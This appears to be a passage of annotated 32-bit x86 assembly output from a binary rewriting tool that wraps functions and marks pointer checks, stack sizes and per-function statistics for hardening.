   push    %ebx                               # [1(332)]stackSize = 0x8   #32
   push    %edi                               # [2(333)]stackSize = 0xc   #32
   push    %esi                               # [3(334)]stackSize = 0x10   #32
   sub     $0xc, %esp                         # [4(335)]stackSize = 0x1c   #32
   mov     %edx, %esi                         # [5(336)]   #32
   mov     %ecx, %ebx                         # [6(337)]   #32
   cmpl    $0x0, 0x20(%ebx)                   # [7(338)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x80485b4 #32
   mov     0x38(%ebx), %ecx                   # [9(340)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [10(341)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048576
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   mov     %eax, %edi                         # [12(343)]   #32
   mov     0x3c(%ebx), %ecx                   # [13(344)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [14(345)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048582
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   test    %edi, %edi                         # [16(347)]   #32
   je      Label_0x804866f #32
   test    %eax, %eax                         # [18(349)]   #32
   je      Label_0x8048671 #32
   mov     %edi, %edx                         # [20(351)]   #32
Label_0x80485a0: #p6a
   mov     %edx, %ecx                         # [21(352)]   #32
   mov     0x14(%ecx), %edx                   # [22(353)]Using Pointer PTRCHECK arg[0]    #32
   test    %edx, %edx                         # [23(354)]   #32
   jne     Label_0x80485a0 #32
   mov     %eax, 0x14(%ecx)                   # [25(356)]Using Pointer PTRCHECK arg[1]  Already checked [22]   #32
   mov     %ecx, 0x10(%eax)                   # [26(357)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x8048671 #32
Label_0x80485b4: #p6a
   mov     0xc(%ebx), %ebx                    # [28(359)]Using Pointer PTRCHECK arg[0]    #32
   xor     %ebp, %ebp                         # [29(360)]   #32
   test    %ebx, %ebx                         # [30(361)]   #32
   je      Label_0x80486d5 #32
Label_0x80485d0: #p6a
   cmp     $0x3, %esi                         # [32(363)]   #32
   je      Label_0x80485f0 #32
   cmp     $0x2, %esi                         # [34(365)]   #32
   jne     Label_0x8048600 #32
   cmpl    $0x0, 0x8(%ebx)                    # [36(367)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x8048644 #32
   cmpl    $0x0, 0xc(%ebx)                    # [38(369)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x8048610 #32
   mov     %ebp, %edi                         # [40(371)]   #32
   jmp     Label_0x8048660 #32
Label_0x80485f0: #p6a
   cmpl    $0x0, 0xc(%ebx)                    # [42(373)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x8048610 #32
   mov     %ebp, %edi                         # [44(375)]   #32
   jmp     Label_0x8048660 #32
Label_0x8048600: #p6a
   cmp     $0x1, %esi                         # [46(377)]   #32
   jne     Label_0x8048610 #32
   cmpl    $0x0, 0x8(%ebx)                    # [48(379)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x8048610 #32
   mov     %ebp, %edi                         # [50(381)]   #32
   jmp     Label_0x8048660 #32
Label_0x8048610: #p6a
   movl    $0x18, 0x4(%esp)                   # [52(383)]   #32
   movl    $0x1, (%esp)                       # [53(384)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804861f
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   mov     %eax, %edi                         # [55(386)]   #32
   movsd   (%ebx), %xmm0                      # [56(387)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%ebx), %xmm1                   # [57(388)]Using Pointer PTRCHECK arg[0]  Already checked [36, 48]   #32
   movsd   %xmm1, 0x8(%edi)                   # [58(389)]Using Pointer PTRCHECK arg[1]    #32
   movsd   %xmm0, (%edi)                      # [59(390)]Using Pointer PTRCHECK arg[1]    #32
   test    %ebp, %ebp                         # [60(391)]   #32
   je      Label_0x8048660 #32
   test    %edi, %edi                         # [62(393)]   #32
   jne     Label_0x8048648 #32
   mov     %ebp, %edi                         # [64(395)]   #32
   jmp     Label_0x8048660 #32
Label_0x8048644: #p6a
   mov     %ebp, %edi                         # [66(397)]   #32
   jmp     Label_0x8048660 #32
Label_0x8048648: #p6a
   mov     %ebp, 0x14(%edi)                   # [68(399)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x10(%edi)                   # [69(400)]Using Pointer PTRCHECK arg[1]    #32
   mov     %edi, 0x10(%ebp)                   # [70(401)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8048660: #p6a
   mov     0x14(%ebx), %ebx                   # [71(402)]Using Pointer PTRCHECK arg[0]    #32
   test    %ebx, %ebx                         # [72(403)]   #32
   mov     %edi, %ebp                         # [73(404)]# FLAGS USED   #32
   jne     Label_0x80485d0 #32
   jmp     Label_0x80486d7 #32
Label_0x804866f: #p6a
   mov     %eax, %edi                         # [76(407)]   #32
Label_0x8048671: #p6a
   mov     0x40(%ebx), %ecx                   # [77(408)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [78(409)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048676
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   test    %edi, %edi                         # [80(411)]   #32
   je      Label_0x80486a1 #32
   test    %eax, %eax                         # [82(413)]   #32
   je      Label_0x80486a3 #32
   mov     %edi, %edx                         # [84(415)]   #32
Label_0x8048690: #p6a
   mov     %edx, %ecx                         # [85(416)]   #32
   mov     0x14(%ecx), %edx                   # [86(417)]Using Pointer PTRCHECK arg[0]    #32
   test    %edx, %edx                         # [87(418)]   #32
   jne     Label_0x8048690 #32
   mov     %eax, 0x14(%ecx)                   # [89(420)]Using Pointer PTRCHECK arg[1]  Already checked [86]   #32
   mov     %ecx, 0x10(%eax)                   # [90(421)]Using Pointer PTRCHECK arg[1]  Already checked [26]   #32
   jmp     Label_0x80486a3 #32
Label_0x80486a1: #p6a
   mov     %eax, %edi                         # [92(423)]   #32
Label_0x80486a3: #p6a
   mov     0x44(%ebx), %ecx                   # [93(424)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [94(425)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80486a8
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   test    %edi, %edi                         # [96(427)]   #32
   je      Label_0x80486d1 #32
   test    %eax, %eax                         # [98(429)]   #32
   je      Label_0x80486d7 #32
   mov     %edi, %edx                         # [100(431)]   #32
Label_0x80486c0: #p6a
   mov     %edx, %ecx                         # [101(432)]   #32
   mov     0x14(%ecx), %edx                   # [102(433)]Using Pointer PTRCHECK arg[0]    #32
   test    %edx, %edx                         # [103(434)]   #32
   jne     Label_0x80486c0 #32
   mov     %eax, 0x14(%ecx)                   # [105(436)]Using Pointer PTRCHECK arg[1]  Already checked [102]   #32
   mov     %ecx, 0x10(%eax)                   # [106(437)]Using Pointer PTRCHECK arg[1]  Already checked [90, 26]   #32
   jmp     Label_0x80486d7 #32
Label_0x80486d1: #p6a
   mov     %eax, %edi                         # [108(439)]   #32
   jmp     Label_0x80486d7 #32
Label_0x80486d5: #p6a
   xor     %edi, %edi                         # [110(441)]   #32
Label_0x80486d7: #p6a
   mov     %edi, %eax                         # [111(442)]   #32
   add     $0xc, %esp                         # [112(443)]stackSize = 0x10   #32
   pop     %esi                               # [113(444)]stackSize = 0xc   #32
   pop     %edi                               # [114(445)]stackSize = 0x8   #32
   pop     %ebx                               # [115(446)]stackSize = 0x4   #32
   pop     %ebp                               # [116(447)]stackSize = 0x0   #32
Label_0x80486e0: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:8 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 5
     adding function wrapper

;     Start Index : 253 (0x8048400)
;       End Index : 269 (0x804845d)
;   Num Instructs : 17
;      Stack Size : 44 (0x2c)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 6
;     ESP Offsets : 6
;                 :  0x0(0x2c), 0x8(0x24), 0x18(0x14), 0x1c(0x10),
;                 :  0x20(0xc), 0x24(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6720,7
.p2align 3,0x6725
FuncPtr_0x8048400:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048400,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048400:

Label_0x8048400:
   sub     $0x2c, %esp                        # [0(253)]stackSize = 0x2c   #32
   cmpl    $0x0, Var_0x80602a8                # [1(254)]   #32
   jne     Label_0x8048455 #32
   movl    $0x0, 0x18(%esp)                   # [3(256)]   #32
   movl    $0x0, 0x1c(%esp)                   # [4(257)]   #32
   movl    $0x2000, 0x20(%esp)                # [5(258)]   #32
   movl    $0x2000, 0x24(%esp)                # [6(259)]   #32
   movsd   0x18(%esp), %xmm0                  # [7(260)]   #32
   movsd   0x20(%esp), %xmm1                  # [8(261)]   #32
   movsd   %xmm1, 0x8(%esp)                   # [9(262)]   #32
   movsd   %xmm0, (%esp)                      # [10(263)]   #32
   mov     $0xd, %ecx                         # [11(264)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804844b
   .long    Func_0x8048460  #pp1w: Label_0x8048460 VAR_ADDRESS #32
   mov     %eax, Var_0x80602a8                # [13(266)]   #32
Label_0x8048455: #p6a
   mov     Var_0x80602a8, %eax                # [14(267)]   #32
   add     $0x2c, %esp                        # [15(268)]stackSize = 0x0   #32
Label_0x804845d: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:5 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 6
     adding function wrapper

;     Start Index : 271 (0x8048460)
;       End Index : 296 (0x80484e9)
;   Num Instructs : 26
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 3
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x8), 0x18(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7620,7
.p2align 3,0x7625
FuncPtr_0x8048460:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048460,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048460:

Label_0x8048460:
   push    %esi                               # [0(271)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(272)]stackSize = 0xc   #32
   mov     %ecx, %esi                         # [2(273)]   #32
   movl    $0x48, (%esp)                      # [3(274)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804846d
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   mov     %esi, (%eax)                       # [5(276)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x10, 0x4(%eax)                   # [6(277)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x8(%eax)                    # [7(278)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0xc(%eax)                    # [8(279)]Using Pointer PTRCHECK arg[1]    #32
   movsd   0x14(%esp), %xmm0                  # [9(280)]   #32
   movsd   0x1c(%esp), %xmm1                  # [10(281)]   #32
   movsd   %xmm1, 0x18(%eax)                  # [11(282)]Using Pointer PTRCHECK arg[1]    #32
   movsd   %xmm0, 0x10(%eax)                  # [12(283)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x20(%eax)                   # [13(284)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x80489a0, 0x24(%eax)             # [14(285)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x8048290, 0x28(%eax)             # [15(286)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x8048b70, 0x2c(%eax)             # [16(287)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x8048ef0, 0x30(%eax)             # [17(288)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x8048f60, 0x34(%eax)             # [18(289)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x38(%eax)                   # [19(290)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x3c(%eax)                   # [20(291)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x40(%eax)                   # [21(292)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x44(%eax)                   # [22(293)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x8, %esp                         # [23(294)]stackSize = 0x4   #32
   pop     %esi                               # [24(295)]stackSize = 0x0   #32
Label_0x80484e9: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:6 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 34
     adding function wrapper

;     Start Index : 2211 (0x804a220)
;       End Index : 2246 (0x804a2cb)
;   Num Instructs : 36
;      Stack Size : 24 (0x18)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 7
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 3
;                 :  0x0(0x18), 0x4(0x14), 0x8(0x10); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8320,7
.p2align 3,0x8325
FuncPtr_0x804a220:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a220,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a220:

Label_0x804a220:
   push    %esi                               # [0(2211)]stackSize = 0x4   #32
   sub     $0x18, %esp                        # [1(2212)]stackSize = 0x1c   #32
   jmp     Label_0x804a244 #32
Label_0x804a230: #p6a
   movl    $Var_0x804bb9a, 0x4(%esp)          # [3(2214)]   #32
   movl    $0x1, (%esp)                       # [4(2215)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a23f
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
Label_0x804a244: #p6a
   movl    $Var_0x804bb39, 0x4(%esp)          # [6(2217)]   #32
   movl    $0x1, (%esp)                       # [7(2218)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a253
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a258
   .long    Func_0x80498c0  #pp1w: Label_0x80498c0 VAR_ADDRESS #32
   test    %eax, %eax                         # [10(2221)]   #32
   mov     $Var_0x80602b5, %esi               # [11(2222)]Loading Variable Pointer 0x80602b5# FLAGS USED   #32
   je      Label_0x804a290 #32
Label_0x804a270: #p6a
   movl    $Var_0x804bb8f, 0x4(%esp)          # [13(2224)]   #32
   movl    $0x1, (%esp)                       # [14(2225)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a27f
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a284
   .long    Func_0x80498c0  #pp1w: Label_0x80498c0 VAR_ADDRESS #32
   test    %eax, %eax                         # [17(2228)]   #32
   jne     Label_0x804a270 #32
Label_0x804a290: #p6a
   movsbl  (%esi), %eax                       # [19(2230)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [20(2231)]   #32
   je      Label_0x804a2a6 #32
   add     $0x1, %esi                         # [22(2233)]   #32
   mov     %eax, (%esp)                       # [23(2234)]   #32
   call    Func_0x804a380  #pp1: Label_0x804a380 VAR_ADDRESS #32
   test    %eax, %eax                         # [25(2236)]   #32
   jne     Label_0x804a290 #32
   jmp     Label_0x804a230 #32
Label_0x804a2a6: #p6a
   movl    $0xa, 0x8(%esp)                    # [28(2239)]   #32
   movl    $0x0, 0x4(%esp)                    # [29(2240)]   #32
   movl    $Var_0x80602b5, (%esp)             # [30(2241)]   #32
   call    Func_0x804b470  #pp1: Label_0x804b470 VAR_ADDRESS #32
   mov     %eax, Var_0x804c000                # [32(2243)]   #32
   add     $0x18, %esp                        # [33(2244)]stackSize = 0x4   #32
   pop     %esi                               # [34(2245)]stackSize = 0x0   #32
Label_0x804a2cb: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:34 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 52   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2852 (0x804aa50)
;       End Index : 2868 (0x804aa7b)
;   Num Instructs : 17
;      Stack Size : 0 (0x0)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0x8(0x4), 0xc(0x4), 0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x420,7
.p2align 3,0x425
FuncPtr_0x804aa50:

Func_0x804aa50:

Label_0x804aa50:
   push    %esi                               # [0(2852)]stackSize = 0x4   #32
   xor     %eax, %eax                         # [1(2853)]   #32
   mov     0x8(%esp), %ecx                    # [2(2854)]   #32
   test    %ecx, %ecx                         # [3(2855)]   #32
   je      Label_0x804aa7a #32
   mov     0x10(%esp), %eax                   # [5(2857)]   #32
   test    %eax, %eax                         # [6(2858)]   #32
   je      Label_0x804aa78 #32
   mov     0xc(%esp), %edx                    # [8(2860)]   #32
   xor     %esi, %esi                         # [9(2861)]   #32
Label_0x804aa70: #p6a
   mov     %dl, (%ecx, %esi ,  0x1)           # [10(2862)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   add     $0x1, %esi                         # [11(2863)]   #32
   cmp     %esi, %eax                         # [12(2864)]   #32
   jne     Label_0x804aa70 #32
Label_0x804aa78: #p6a
   mov     %ecx, %eax                         # [14(2866)]   #32
Label_0x804aa7a: #p6a
   pop     %esi                               # [15(2867)]stackSize = 0x0   #32
Label_0x804aa7b: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:52 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 77   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 3467 (0x804b230)
;       End Index : 3485 (0x804b259)
;   Num Instructs : 19
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 2
;      ESP Params : 
;                 :  0x4(0x4), 0x8(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 2
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6320,7
.p2align 3,0x6325
FuncPtr_0x804b230:

Func_0x804b230:

Label_0x804b230:
   mov     0x4(%esp), %ecx                    # [0(3467)]   #32
   mov     (%ecx), %dl                        # [1(3468)]Using Pointer PTRCHECK arg[0]    #32
   test    %dl, %dl                           # [2(3469)]   #32
   mov     0x8(%esp), %eax                    # [3(3470)]# FLAGS USED   #32
   je      Label_0x804b251 #32
Label_0x804b23e: #p6a
   mov     (%eax), %dh                        # [5(3472)]Using Pointer PTRCHECK arg[0]    #32
   test    %dh, %dh                           # [6(3473)]   #32
   je      Label_0x804b251 #32
   cmp     %dh, %dl                           # [8(3475)]   #32
   jne     Label_0x804b251 #32
   add     $0x1, %eax                         # [10(3477)]   #32
   mov     0x1(%ecx), %dl                     # [11(3478)]Using Pointer PTRCHECK arg[0]    #32
   add     $0x1, %ecx                         # [12(3479)]   #32
   test    %dl, %dl                           # [13(3480)]   #32
   jne     Label_0x804b23e #32
Label_0x804b251: #p6a
   movsbl  (%eax), %eax                       # [15(3482)]Using Pointer PTRCHECK arg[0]  Already checked [5]   #32
   movsbl  (%ecx), %ecx                       # [16(3483)]Using Pointer PTRCHECK arg[0]  Already checked [1]   #32
   sub     %ecx, %eax                         # [17(3484)]   #32
Label_0x804b259: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:77 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 1
     adding function wrapper

;     Start Index : 0 (0x80480a0)
;       End Index : 32 (0x80480f9)
;   Num Instructs : 33
;      Stack Size : 16 (0x10)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 3
;                 :  0x0(0x10),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4820,7
.p2align 3,0x4825
FuncPtr_0x80480a0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80480a0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80480a0:

Label_0x80480a0:
   push    %ebx                               # [0(0)]stackSize = 0x4   #32
   push    %edi                               # [1(1)]stackSize = 0x8   #32
   push    %esi                               # [2(2)]stackSize = 0xc   #32
   sub     $0x10, %esp                        # [3(3)]stackSize = 0x1c   #32
   movl    $0x40, (%esp)                      # [4(4)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80480ad
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   mov     0x24(%esp), %ecx                   # [6(6)]   #32
   lea     -0x1(%ecx), %edx                   # [7(7)] Loading Pointer with stackSize: 28   #32
   mov     %edx, (%eax)                       # [8(8)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x28(%esp), %esi                   # [9(9)]   #32
   lea     -0x1(%esi), %edi                   # [10(10)] Loading Pointer with stackSize: 28   #32
   mov     %edi, 0x4(%eax)                    # [11(11)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ecx, 0x8(%eax)                    # [12(12)]Using Pointer PTRCHECK arg[1]    #32
   mov     %edi, 0xc(%eax)                    # [13(13)]Using Pointer PTRCHECK arg[1]    #32
   lea     0x1(%ecx), %ebx                    # [14(14)] Loading Pointer with stackSize: 28   #32
   mov     %ebx, 0x10(%eax)                   # [15(15)]Using Pointer PTRCHECK arg[1]    #32
   mov     %edi, 0x14(%eax)                   # [16(16)]Using Pointer PTRCHECK arg[1]    #32
   mov     %edx, 0x18(%eax)                   # [17(17)]Using Pointer PTRCHECK arg[1]    #32
   mov     %esi, 0x1c(%eax)                   # [18(18)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ebx, 0x20(%eax)                   # [19(19)]Using Pointer PTRCHECK arg[1]    #32
   mov     %esi, 0x24(%eax)                   # [20(20)]Using Pointer PTRCHECK arg[1]    #32
   mov     %edx, 0x28(%eax)                   # [21(21)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x1, %esi                         # [22(22)]   #32
   mov     %esi, 0x2c(%eax)                   # [23(23)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ecx, 0x30(%eax)                   # [24(24)]Using Pointer PTRCHECK arg[1]    #32
   mov     %esi, 0x34(%eax)                   # [25(25)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ebx, 0x38(%eax)                   # [26(26)]Using Pointer PTRCHECK arg[1]    #32
   mov     %esi, 0x3c(%eax)                   # [27(27)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x10, %esp                        # [28(28)]stackSize = 0xc   #32
   pop     %esi                               # [29(29)]stackSize = 0x8   #32
   pop     %edi                               # [30(30)]stackSize = 0x4   #32
   pop     %ebx                               # [31(31)]stackSize = 0x0   #32
Label_0x80480f9: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:1 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 2
     adding function wrapper

;     Start Index : 33 (0x8048100)
;       End Index : 131 (0x804828e)
;   Num Instructs : 99
;      Stack Size : 44 (0x2c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 7
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 7
;     ESP Offsets : 9
;                 :  0x0(0x2c), 0x4(0x28), 0x8(0x24), 0x1c(0x10),
;                 :  0x20(0xc), 0x24(0x8), 0x28(0x4),
;      ESP Params : 
;                 :  0x40(0x4), 0x44(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 5
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1620,7
.p2align 3,0x1625
FuncPtr_0x8048100:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048100,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048100:

Label_0x8048100:
   push    %ebp                               # [0(33)]stackSize = 0x4   #32
   push    %ebx                               # [1(34)]stackSize = 0x8   #32
   push    %edi                               # [2(35)]stackSize = 0xc   #32
   push    %esi                               # [3(36)]stackSize = 0x10   #32
   sub     $0x2c, %esp                        # [4(37)]stackSize = 0x3c   #32
   mov     0x44(%esp), %esi                   # [5(38)]   #32
   xor     %eax, %eax                         # [6(39)]   #32
   test    %esi, %esi                         # [7(40)]   #32
   je      Label_0x8048287 #32
   xor     %eax, %eax                         # [9(42)]   #32
Label_0x8048117: #p6a
   mov     %eax, 0x20(%esp)                   # [10(43)]   #32
Label_0x8048120: #p6a
   cmpl    $0x0, 0xc(%esi)                    # [11(44)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x8048140 #32
   mov     0x14(%esi), %esi                   # [13(46)]Using Pointer PTRCHECK arg[0]    #32
   test    %esi, %esi                         # [14(47)]   #32
   jne     Label_0x8048120 #32
   jmp     Label_0x8048283 #32
Label_0x8048140: #p6a
   mov     (%esi), %eax                       # [17(50)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%esi), %ecx                    # [18(51)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, 0x4(%esp)                    # [19(52)]   #32
   mov     %eax, (%esp)                       # [20(53)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804814c
   .long    Func_0x80480a0  #pp1w: Label_0x80480a0 VAR_ADDRESS #32
   mov     %eax, %ebx                         # [22(55)]   #32
   movl    $0x48, (%esp)                      # [23(56)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804815a
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   mov     %eax, %edi                         # [25(58)]   #32
   mov     %ebx, 0x4(%esp)                    # [26(59)]   #32
   mov     %edi, (%esp)                       # [27(60)]   #32
   movl    $0x40, 0x8(%esp)                   # [28(61)]   #32
   call    Func_0x804a9d0  #pp1: Label_0x804a9d0 VAR_ADDRESS #32
   movsd   (%esi), %xmm0                      # [30(63)]Using Pointer PTRCHECK arg[0]  Already checked [17]   #32
   mov     %esi, 0x1c(%esp)                   # [31(64)]   #32
   movsd   %xmm0, 0x40(%edi)                  # [32(65)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ebx, (%esp)                       # [33(66)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048185
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   movl    $0x0, 0x28(%esp)                   # [35(68)]   #32
   cmpl    $0x0, 0x48(%esp)                   # [36(69)]   #32
   je      Label_0x8048262 #32
   movl    $0x0, 0x24(%esp)                   # [38(71)]   #32
   mov     0x48(%esp), %esi                   # [39(72)]   #32
   movl    $0x0, 0x28(%esp)                   # [40(73)]   #32
Label_0x80481c0: #p6a
   mov     (%esi), %eax                       # [41(74)]Using Pointer PTRCHECK arg[0]  Already checked [41]   #32
   xor     %ebx, %ebx                         # [42(75)]   #32
Label_0x80481d0: #p6a
   mov     (%edi, %ebx ,  0x8), %ecx          # [43(76)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   cmp     %ecx, %eax                         # [44(77)]   #32
   jne     Label_0x80481e2 #32
   mov     0x4(%esi), %ebp                    # [46(79)]Using Pointer PTRCHECK arg[0]  Already checked [46]   #32
